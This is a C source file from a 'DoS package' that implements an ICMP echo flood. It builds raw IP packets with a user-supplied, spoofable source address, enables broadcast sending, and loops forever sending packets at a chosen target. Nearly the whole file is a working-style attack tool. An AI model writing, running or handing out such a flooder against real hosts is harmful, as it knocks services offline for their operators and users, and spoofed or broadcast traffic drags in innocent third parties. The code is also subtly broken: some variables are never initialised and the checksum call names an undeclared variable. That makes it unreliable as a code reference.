/**
 * DoS : Denial Of Service Attack
 * ICMP Flooding
 *
 *
 * Orriginally Written By Silver Moon
 *
 * Version 2 Written By Josh Harshman (DeadDingo) joshgreyhat@gmail.com
 * Copyright 12.21.2013 Josh Harshman
 *
 *
 * This file is part of the DoS package
 *
 * The DoS package is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public Licence as published by
 * the Free Software Foundation, etierh version 3 of the Licence, or
 * (at your option) any later version.
 *
 * The DoS package is distrubuted in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied arranty of
 * MERCHANTABLILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public Licence for more details.
 *
 * You should have received a copy of the GNU General Public Licence
 * along with the DoS package.  If not, see <http://www.gnu.org/licences/>.
 *
 *
 * ================================================
 * Version 2 Channel Log:
 *
 *  - Now protected under the GNU Public Licence
 *  - Better Argument Parsing
 *  - Better Error Checking
 *  - More Informative Usage Dialog
 *  - Utilized a header file to prototype satellite functions
 *  - Separate .c file defines prototypes in header file
 *  - Fixed Bad Structure Types (Now runs on BSD)
 *  - 
 *
 * */

#include "packetsoup.h"


int main ( int argc, char *argv[ ] ) {

  unsigned long daddr;
  unsigned long saddr;
  int payload_size = 0, sent, sent_size, on, i;


  /*
  * Argument Parsing...*/

  if(argc < 3) {
    Usage();
  }

  for( i = 1; i < argc; i ++ ) {
    
    if(strncmp(argv[i], "-s", 2) == 0) {
      saddr = inet_addr(argv[i+1]);
    }
    if(strncmp(argv[i], "-d", 2) == 0) {
      daddr = inet_addr(argv[i+1]);
    }
    if(strncmp(argv[i], "-p", 2) == 0) {
      payload_size = atoi(argv[i+1]);
    }
  } //end for loop
  //end arg parsing


  //echo back arguments for testing
  /*
  printf("Source Address (saddr): %lu\n", saddr);
  printf("Destination Address (daddr) %lu\n", daddr);
  printf("Payload Size (payload_size) %d\n", payload_size);
  */

  //Get Raw Socket
  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  if(sockfd < 0) {
    perror("Could not create socket:");
    return 0;
  }

  puts("Socket Is Live!");

  //provide packet headers
  if( setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char *)&on, sizeof(on)) == -1 ) {
    perror("setsockopt:");
    return 0;
  }

  //allow socket to send datagrams to broadcast addresses
  if( setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, (const char *)&on, sizeof(on)) == -1 ) {
    perror("setsockopt");
    return 0;
  }

  //calculate packet size
  //WARNING!!!
  //The Structs iphdr and icmphdr might not exist in Apple OSX
  //In order to maintain cross platform usability, utilize the makefile to do conditional preprocessing.
  int packet_size = sizeof(struct ip) + sizeof(struct icmp) + payload_size;
  char *packet = (char *)malloc(packet_size);

  if(!packet) {
    perror("Memory Error");
    close(sockfd);
    return 0;
  }

  //ip header
  struct ip *iphdr = (struct ip *)packet;
  struct icmp *icmphdr = (struct icmp *) (packet + sizeof(struct ip));

  //zero the packet buffer
  memset(packet, 0, packet_size);
  
  //set member variables and whatnot
  iphdr->ip_v = 4;
  iphdr->ip_hl = 5;
  iphdr->ip_tos = 0;
  iphdr->ip_len = htons(packet_size);
  iphdr->ip_id = rand();
  iphdr->ip_off = 0;
  iphdr->ip_ttl = 255;
  iphdr->ip_p = IPPROTO_ICMP;
  iphdr->ip_src.s_addr = saddr;
  iphdr->ip_dst.s_addr = daddr;
  //
  
  icmphdr->icmp_type = ICMP_ECHO;
  icmphdr->icmp_code = 0;
  icmphdr->icmp_seq = rand();
  icmphdr->icmp_id = rand();
  icmphdr->icmp_cksum = 0;
  
  struct sockaddr_in servaddr;
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = daddr;

  memset(&servaddr.sin_zero, 0, sizeof(servaddr.sin_zero));

  puts("Flooding Target...");

  while(1) {

    memset(packet + sizeof(struct ip) + sizeof(struct icmp), rand() % 255, payload_size);
    
    //calculate icmp header checksum
    icmphdr->icmp_cksum = 0;
    icmphdr->icmp_cksum = in_cksum( (unsigned short *)icmp, sizeof(struct icmp) + payload_size );

    if( ( sent_size = sendto( sockfd, packet, packet_size, 0, (struct sockaddr *) &servaddr, sizeof(servaddr) ) ) < 1 ) {
      perror("Packet Send Failed");
      break;
    }
    ++sent;
    printf("%d packets sent\r", sent);
    fflush(stdout);

    usleep(10000);

  }

  free(packet);
  close(sockfd);

  return 0;
}
